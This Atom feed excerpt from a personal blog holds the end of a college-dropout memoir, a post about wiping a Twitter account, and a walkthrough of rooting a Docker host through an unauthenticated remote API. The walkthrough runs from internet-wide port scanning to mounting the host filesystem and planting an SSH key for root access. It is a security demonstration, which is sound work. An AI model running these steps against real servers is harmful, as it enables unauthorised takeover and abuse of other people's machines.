well, probably. And so back to college I went.&lt;&#x2F;p&gt;
&lt;p&gt;Because I showed up for only 20% of the time, I had to redo the first year of my
IT college. I wasn’t looking forward to it, but during my 2nd 1st (hehe) year I met
some really, really good people who I genuinely enjoyed hanging around with,
and it’s these people who got me through my first and second year of college.&lt;&#x2F;p&gt;
&lt;p&gt;Shoutout to my friends from that time, especially Jeffrey (💋) who to this day
I’m still pretty good friends with.
It’s now 2006. I’m in the 2nd (3rd) year of college and things are going well. I still
hate school, but my friends are dope. To graduate with an associates degree you
have to perform a compulsory internship. I never bothered to send out a cover
letter to anyone, and so college presented me with an option: “here’s three
companies, fingers crossed one of them picks you or else you’ll have to redo the
2nd year”. I don’t know why, but the Dutch Department of Justice, out of all
possibilities, was graceful enough to allow me to perform an internship at their
Rotterdam Court building. One of the biggest judicial buildings in the
Netherland, I was responsible, kinda, for supporting around 2000 users, 300
printers, and a bunch of courtrooms.&lt;&#x2F;p&gt;
&lt;p&gt;I worked with a diverse team, and I enjoyed working with everyone there. But
more than anything, I actually enjoyed my job. I’ll save the contents of my job for
another day, but it was basically helping end-users (the magistrates, the clerks,
the assistants, the lunch ladies, and the court police) with whatever issue they
had with their hard- or software. I haven’t had a single bad experience. Even
when they thought they could piss me off by asking to take inventory of all
printers within the court complex I could not be detered. My work ethic, if you
could call it that, did not go unnoticed and I was asked if I could help out full-time
over the summer holiday. 2,5 months of rummaging around with computers and
fixing people their problem? Let’s do this!&lt;&#x2F;p&gt;
&lt;p&gt;Then in September 2007 the fun ended. I had to go back to school. Having made
some money I was, rightfully so, asked to pay for my own education by my mom.
Luckily, being part of the judicial system motivated me to do something with my
life, and my knack for computers and sense of justice made me change from the
generic IT track to a new track called “digital forensics”. This meant ditching my
friends, but it also meant I could actually go to school and learn something new.&lt;&#x2F;p&gt;
&lt;p&gt;Filled with motivation I attended my first few classes. And although I was
learning new things, what I also learned was that this new track was not just
“new”. We were effectively beta-testing the program. Teachers who previously
taught regular IT classes now taught digital forensics classes.
A few weeks later the inevitable happened: my motivation to do a good job was
shattered. It was during a class on “collecting evidence”. Following the
instructions of the teacher, I carefuly documented each step I took trying to find
“evidence” for a crime on a USB drive that was given to me. As my fellow
students completed the task in 15~ minutes, I was barely done before after the 2
hour period was over. The teacher asked me why it took me so long, I presented
him with my notes and the premise of the task: “Document every step you take,
and every finding you make”. My fellow students barely wrote down where they
found the “evidence”. “Don’t take it so serious next time.” was the advice my
teacher gave me. Now you might tell me, “yeah, Brian. Don’t take it so serious”.
And you know? Maybe you’re right. But I could no longer be bothered to try.
And then came the straw that broke the camels back. Because during that two
hour period, what did my classmates do after 15 minutes? Well, they did nothing.
Nothing? What? Yes. Nothing. Remember a few paragraphs ago when I said we
were beta testing this new course and our teachers were non-specialized
teachers? They didn’t know what to do either. And so we would spend hours just
idling in class. Either playing Tibia, one of the few network games that worked,
doing some course work, or not. Eventually on some days we would spend 3
hours in a classroom with a custodian under the guise of “homework time”. Just
as we had no homework, the school did not have teachers.&lt;&#x2F;p&gt;
&lt;p&gt;And so on one undoubtedly cold Autumn day, October 29th of 2006, (I checked
my email to confirm the date!) I stood up and packed my bag. The custodian
asked me where I was going.&lt;&#x2F;p&gt;
&lt;p&gt;“Home”&lt;&#x2F;p&gt;
&lt;p&gt;“- You can’t go home, you have class.”&lt;&#x2F;p&gt;
&lt;p&gt;“OK, then I’ll unenroll from college.”&lt;&#x2F;p&gt;
&lt;p&gt;“- You can’t because by law you have to be enrolled”&lt;&#x2F;p&gt;
&lt;p&gt;“I don’t think that’s true”&lt;&#x2F;p&gt;
&lt;p&gt;And so I walked out of class, to the administration office and asked to unroll.
Administration told me the same. “You can’t unenroll”. Yes I can. I’m paying for
my own education. “Oh?”. A few confusing minutes later administration was able
to present me with a form that would cancel my obligations and unenroll me
from the Albeda College. A penstroke, and the deed was done.
I was free! Impulsive. But also free!&lt;&#x2F;p&gt;
&lt;p&gt;I’ll never forget the feeling of walking away from college that day. The
soundtrack would’ve been Andy Williams’ “Born Free”. Slightly dramatic, but
that’s how I free I felt. Of course I now had to tell my mom that I had dropped
out of college. Because I was free as the roaring tide, and there was no need to
hide. Well, there was a need to hide. My mom was not entertained by the idea
that she now had a college drop-out son who had literally 0 credentials, 0
diplomas, and and on top of that was incredibly lazy.&lt;&#x2F;p&gt;
&lt;p&gt;As moms do, I was threatened by being kicked out of the house unless I found a
job within a month. I’m not going to lie, finding a job wasn’t on my mind at all. All
I knew was that I was not going back to school. Armed with nothing but the
prospect of becoming homeless I set out to find a job. And a job I found! As a
support engineer at the Department of Waterworks. To this day I don’t know why
they took the gamble, but I fared quite well and was offered a full-time contract
after about a year and a half. My team-lead at the time said the government
would kill any ambitions I had, and said I shouldn’t take the offer. Finally some
good advice.&lt;&#x2F;p&gt;
&lt;p&gt;I declined the offer, and remained, as Andy Williams put it, free to follow my
heart. I ended up becoming a programmer, consultant, web developer, to
eventually end up where I am right now: a CTO for an eCommerce company in
South-East Asia, moonlighting with his own development shack on the side.
I don’t know why I’m writing this. I don’t know if there’s any lessons to be learned
here. I would not advice anyone to drop out of college. But I wouldn’t advice you
to stay in college either. Should you follow your heart? I don’t know man. Just do
what makes you happy. And don’t be a dick.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>I nuke my Twitter account.</title>
        <published>2018-08-16T00:00:00+00:00</published>
        <updated>2018-08-16T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Brian de Heus
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://brian.jp/cya-twitter/"/>
        <id>https://brian.jp/cya-twitter/</id>
        
        <content type="html" xml:base="https://brian.jp/cya-twitter/">&lt;p&gt;I’ve deleted my tweets. I’m deleting my favs. I’ve reset my profile. The only thing that makes me not delete my entire
account is the single sign-on I have for a few websites, required access to the developer APIs, and the few friends I am
contact with now and then via their direct messages.&lt;&#x2F;p&gt;
&lt;p&gt;Why? Because Twitter stopped being fun. 8 years and now 65,000 deleted Tweets later I decided to call it quits. All
because it stopped being fun. My timeline was overrun with inappropriate ads, news that the world was supposed to end,
virtue signaling from all political leanings imaginable. Unbased accusations left and right &lt;em&gt;(hehe)&lt;&#x2F;em&gt;. I made it a habbit
not to follow news accounts. But you can’t escape the bullshit on Twitter.&lt;&#x2F;p&gt;
&lt;p&gt;I assumed I’d keep my Twitter and tweets around as a monument to my boring life. Not to show the world who I was, but to
prove to myself that I existed. Something like a diary. Something for my daughter to enjoy and read when I’m older.
Something for myself to enjoy when I’m older. Even if I wasn’t using Twitter anymore. But no – even that got ruined by
Twitter when they suspended the account of a deceased friend, because he auto-posted messages from the afterlife. And
recently they suspended Robin Williams’ account. So much for that plan.&lt;&#x2F;p&gt;
&lt;p&gt;It was fun. But all good things must come to an end.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Free compute with unsecured Docker APIs.</title>
        <published>2017-10-31T00:00:00+00:00</published>
        <updated>2017-10-31T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Brian de Heus
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://brian.jp/dangers-of-docker-remote-api/"/>
        <id>https://brian.jp/dangers-of-docker-remote-api/</id>
        
        <content type="html" xml:base="https://brian.jp/dangers-of-docker-remote-api/">&lt;p&gt;The other day I was casually browsing the internet and was reading about how thousands of MongoDB databases were exposed
to the internet. Unauthenticated for the world to use. Bandits encrypted databases and held them for randsom. A randsom
payable in your favorite crypto currency. This all happened a few months ago, and surely we’ve all learnt not to expose
our services for the entire world to use? Right? … right?&lt;&#x2F;p&gt;
&lt;p&gt;Well, if you’d assume that people never learn you’re right on the money, my friend. So in todays episode of “Wow I can’t
believe people are still doing that” I present to you: “Exploiting the Docker Remote API, or how to root thousands of
machines”&lt;&#x2F;p&gt;
&lt;p&gt;Because scanning the entire internet for open ports is bad, I decided to be curtious and port scan only the IP blocks
that Amazon exposes for their EC2 instances. Mind you, this is still over 27 million IP addresses but it would be a good
enough sample size for me.&lt;&#x2F;p&gt;
&lt;p&gt;Using masscan, and a low &lt;code&gt;--rate&lt;&#x2F;code&gt;, I scanned all 27 million IP addresses for the Docker remote API ports and found 3,000
servers that were actively listening on this port. A little filtering and probing later and I found a little over a 1000
servers that have have an unsecured Docker API.&lt;&#x2F;p&gt;
&lt;p&gt;Because I’m a strong believer in ethics (oh?), I decided not to probe any deeper but instead demonstrate what a
potential attack could look like, and how I could’ve rooted a thousand servers with ease to launch a &lt;em&gt;sick&lt;&#x2F;em&gt; denial of
service attack.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;step-1-finding-a-vulnerable-machine&quot;&gt;Step 1. Finding a vulnerable machine&lt;&#x2F;h2&gt;
&lt;p&gt;For demonstration purposes, I’ve spun up 3 small instances on Digital Ocean running a Docker Swarm.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;root@swarm-1:~# docker node ls                                      
&lt;&#x2F;span&gt;&lt;span&gt;ID                            HOSTNAME            STATUS              AVAILABILITY        MANAGER STATUS             
&lt;&#x2F;span&gt;&lt;span&gt;ni2087pprn601724too0ys0b3 *   swarm-1             Ready               Active              Leader                     
&lt;&#x2F;span&gt;&lt;span&gt;0qqozi3jv21w9nr2oax97opvi     swarm-2             Ready               Active                                        
&lt;&#x2F;span&gt;&lt;span&gt;umxd955a9cqxeag3v1howj287     swarm-3             Ready               Active
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Some quick Googling on how to enable the Docker remote API, will send
you &lt;a href=&quot;https:&#x2F;&#x2F;www.ivankrizsan.se&#x2F;2016&#x2F;05&#x2F;18&#x2F;enabling-docker-remote-api-on-ubuntu-16-04&#x2F;&quot;&gt;here&lt;&#x2F;a&gt;, and will conveniently
show you how to make the remote API listen on all your network addresses. The post was shy of asking users to add a rule
to their iptables, but because Digital Ocean is a sweetheart and doesn’t provide a running firewall by default, and
because their default ubuntu image comes with the firewall disabled out of the box there is nothing to worry about.&lt;&#x2F;p&gt;
&lt;p&gt;A quick restart of my Docker daemon and:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;GET http:&#x2F;&#x2F;128.199.130.138:4243&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;message&amp;quot;: &amp;quot;page not found&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Will show that we’re in!&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;GET http:&#x2F;&#x2F;128.199.130.138:4243&#x2F;nodes
&lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;quot;ID&amp;quot;: &amp;quot;0qqozi3jv21w9nr2oax97opvi&amp;quot;,
&lt;&#x2F;span&gt;&lt;span&gt;},
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;quot;ID&amp;quot;: &amp;quot;ni2087pprn601724too0ys0b3&amp;quot;,
&lt;&#x2F;span&gt;&lt;span&gt;},
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;quot;ID&amp;quot;: &amp;quot;umxd955a9cqxeag3v1howj287&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Sweet, we have access.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;step-2-connecting-to-the-cli&quot;&gt;Step 2. Connecting to the CLI&lt;&#x2F;h2&gt;
&lt;p&gt;When you look through the &lt;a href=&quot;https:&#x2F;&#x2F;docs.docker.com&#x2F;engine&#x2F;api&#x2F;v1.24&#x2F;&quot;&gt;Engine API&lt;&#x2F;a&gt; you’ll see that you can wreack enough
havoc, but for fun let’s use the docker CLI!&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;[brian@localhost ~]$ docker -H 128.199.130.138:4243 node ls
&lt;&#x2F;span&gt;&lt;span&gt;ID                           HOSTNAME  STATUS  AVAILABILITY  MANAGER STATUS
&lt;&#x2F;span&gt;&lt;span&gt;0qqozi3jv21w9nr2oax97opvi    swarm-2   Ready   Active        
&lt;&#x2F;span&gt;&lt;span&gt;ni2087pprn601724too0ys0b3 *  swarm-1   Ready   Active        Leader
&lt;&#x2F;span&gt;&lt;span&gt;umxd955a9cqxeag3v1howj287    swarm-3   Ready   Active       
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now we’re getting somewhere. Full access ahoy.&lt;&#x2F;p&gt;
&lt;p&gt;If you have a little bit of imagination you can realise that we can easily launch a bunch of containers to perform a
distributed denial of service attack. We could easily find all docker machines, make them leave their swarm, then make
them join our malicious swarm to really ramp things up.&lt;&#x2F;p&gt;
&lt;p&gt;However for this excercise, let’s not&lt;&#x2F;p&gt;
&lt;h2 id=&quot;step-3-rooting-the-host&quot;&gt;Step 3. Rooting the host&lt;&#x2F;h2&gt;
&lt;p&gt;With Docker you can run images in interactive terminal mode, and mount the hosts volume to the container. So why not
mount the root volume:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;[brian@localhost ~]$ docker -H 128.199.130.138:4243 run -v &#x2F;:&#x2F;host -it ubuntu
&lt;&#x2F;span&gt;&lt;span&gt;Unable to find image &amp;#39;ubuntu:latest&amp;#39; locally
&lt;&#x2F;span&gt;&lt;span&gt;latest: Pulling from library&#x2F;ubuntu
&lt;&#x2F;span&gt;&lt;span&gt;...
&lt;&#x2F;span&gt;&lt;span&gt;Status: Downloaded newer image for ubuntu:latest
&lt;&#x2F;span&gt;&lt;span&gt;root@4d2d6002beff:&#x2F;# 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To confirm we’ve mounted the hosts root, and not our local drive:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;root@58e0c2532e1e:&#x2F;host# cat &#x2F;host&#x2F;etc&#x2F;*-release
&lt;&#x2F;span&gt;&lt;span&gt;DISTRIB_ID=Ubuntu
&lt;&#x2F;span&gt;&lt;span&gt;DISTRIB_RELEASE=16.04
&lt;&#x2F;span&gt;&lt;span&gt;DISTRIB_CODENAME=xenial
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Making our way to the &lt;code&gt;~&#x2F;.ssh&lt;&#x2F;code&gt; folder to add our own public key:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;root@58e0c2532e1e:&#x2F;host&#x2F;root&#x2F;.ssh# echo &amp;quot;ssh-rsa publickey&amp;quot; &amp;gt;&amp;gt; authorized_keys
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now from our local machine:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;[brian@localhost ~]$ ssh -i ~&#x2F;.ssh&#x2F;docker-funtime root@128.199.130.138
&lt;&#x2F;span&gt;&lt;span&gt;Welcome to Ubuntu 16.04.3 LTS (GNU&#x2F;Linux 4.4.0-93-generic x86_64)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com
&lt;&#x2F;span&gt;&lt;span&gt; * Management:     https:&#x2F;&#x2F;landscape.canonical.com
&lt;&#x2F;span&gt;&lt;span&gt; * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  Get cloud support with Ubuntu Advantage Cloud Guest:
&lt;&#x2F;span&gt;&lt;span&gt;    http:&#x2F;&#x2F;www.ubuntu.com&#x2F;business&#x2F;services&#x2F;cloud
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;47 packages can be updated.
&lt;&#x2F;span&gt;&lt;span&gt;24 updates are security updates.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Last login: Tue Oct 10 09:47:55 2017 from 118.238.203.186
&lt;&#x2F;span&gt;&lt;span&gt;root@swarm-1:~# docker ps
&lt;&#x2F;span&gt;&lt;span&gt;CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
&lt;&#x2F;span&gt;&lt;span&gt;58e0c2532e1e        ubuntu              &amp;quot;&#x2F;bin&#x2F;bash&amp;quot;         8 minutes ago       Up 8 minutes                            naughty_jennings
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Taadaa – you have succesfully rooted an unprotoced docker swarm host.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;how-to-prevent-this&quot;&gt;How to prevent this?&lt;&#x2F;h1&gt;
&lt;p&gt;Simple: do not, under any circumstance, expose your docker APIs to the internet.&lt;&#x2F;p&gt;
</content>
        
    </entry>
</feed>
